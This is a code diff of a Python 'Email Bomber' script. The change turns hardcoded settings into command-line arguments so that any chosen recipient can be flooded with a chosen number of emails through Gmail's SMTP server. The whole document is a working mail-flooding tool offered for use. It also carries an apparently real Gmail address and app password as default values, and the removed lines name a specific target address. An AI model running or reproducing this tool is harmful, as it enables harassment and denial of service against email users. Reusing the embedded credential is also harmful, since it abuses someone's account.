@@ -1,15 +1,33 @@
 import smtplib
 import random
+import argparse
 from email.message import EmailMessage
 
-email_sender =  "rednazskoorb@gmail.com"
-email_password = "icox wnqo xcao ttkk"
-email_receiver = "dadgarkiani123@gmail.com"
+# enter YOUR email and create password 
 
 
-spam_messages_text = "EmailBomber/messages.txt"
 
-subject = "ILOVEYOU" # trubute to ILOVEYOU Virus
+
+
+parser = argparse.ArgumentParser(
+    description="📨 Email Bomber Script by Zander Brooks",
+    epilog="Example usage:\n  python email_bomber.py example_subject recipient@example.com 100 --optional body",
+    formatter_class=argparse.RawTextHelpFormatter
+)
+
+parser.add_argument('--sender', type=str, default='rednazskoorb@gmail.com', help='Email address to send from')
+parser.add_argument('--password', type=str, default='icox wnqo xcao ttkk', help='App password for the sender email')
+
+parser.add_argument('to', type=str, help='Email recipient')
+parser.add_argument('subject', type=str, help='Email Subject')
+parser.add_argument('count', type=int, help='Size of Email Bomb')
+parser.add_argument('body', type=str, nargs='?', default=None, help='Optional Email Body (leave blank for random messages)')
+
+args = parser.parse_args()
+
+spam_messages_text = "messages.txt"
+
+
 
 
 with open(spam_messages_text, "r") as file:
@@ -19,13 +37,18 @@ random.shuffle(phrases)
 
 
 
-for i in range(1000):
+for i in range(args.count):
 
     msg = EmailMessage()
-    msg['From'] = email_sender
-    msg['To'] = email_receiver
-    msg['subject'] = subject
-    msg.set_content(phrases[i].strip())
+    msg['From'] = args.sender
+    msg['To'] = args.to
+    msg['subject'] = args.subject
+    if(args.body):
+        msg.set_content(args.body)
+    else:
+        msg.set_content(phrases[i].strip())
+
+    
     try:
 
         #Ports to use incase 465 Doesnt work for you
@@ -34,7 +57,7 @@ for i in range(1000):
         # 587 - Gmail, Yahoo, Outlook, iCloud, Zoho
         # 2525 - Mailgun, SendGrid, Postmark
         with smtplib.SMTP_SSL("smtp.gmail.com", 465) as smtp:
-            smtp.login(email_sender,email_password)
+            smtp.login(args.sender,args.password)
             smtp.send_message(msg)
             print("Email sent sucessfully!")
     except Exception as e:
